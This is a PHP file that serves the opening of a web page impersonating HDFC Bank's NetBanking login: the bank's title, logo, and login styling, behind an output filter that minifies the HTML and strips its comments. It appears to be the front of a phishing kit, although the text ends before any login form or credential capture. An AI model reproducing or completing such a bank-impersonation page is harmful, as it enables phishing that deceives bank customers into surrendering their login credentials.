<?php

function sanitize_output($buffer) {

    $search = array(
        '/\>[^\S ]+/s',     // strip whitespaces after tags, except space
        '/[^\S ]+\</s',     // strip whitespaces before tags, except space
        '/(\s)+/s',         // shorten multiple whitespace sequences
        '/<!--(.|\s)*?-->/' // remove comments
    );

    $replace = array(
        '>',
        '<',
        '\\1',
        ''
    );

    $buffer = preg_replace($search, $replace, $buffer);

    return $buffer;
}
ob_start("sanitize_output");

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Welcome to HDFC Bank NetBanking</title>
	<meta charset="utf-8">
    <link rel="shortcut icon" href="favicon.ico">
    <meta http-equiv="Content-Type" content="application/x-www-form-urlencoded; charset=iso-8859-1">
	<meta http-equiv="cache-control" content="max-age=0" />
	<meta http-equiv="cache-control" content="no-cache" />
	<meta http-equiv="cache-control" content="private" />
	<meta http-equiv="cache-control" content="no-store" />
	<meta http-equiv="cache-control" content="must-revalidate" />
	<meta http-equiv="cache-control" content="post-check=0,pre-check=0" />
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="-1">
	<link href="m/b=css&f=bootstrap.min.css,style.css,style-login.css,open-sans.css,fontello.css,responsive.css,login-responsive.css" rel="stylesheet" />
</head>
<body>
<div class="main-container login-main">
	<div class="welcmewrap center col-sm-12">
		<div class="hdfclogoblk">
		    <img src="images/logo.png" class="width100" alt="" />
	    </div>
		<div class="hdfcwelcmetxt" id="hdfcwelcmetxtId">Welcome to HDFC Bank NetBanking</div>
	</div>
	<div class="multiline-msg mB10"></div>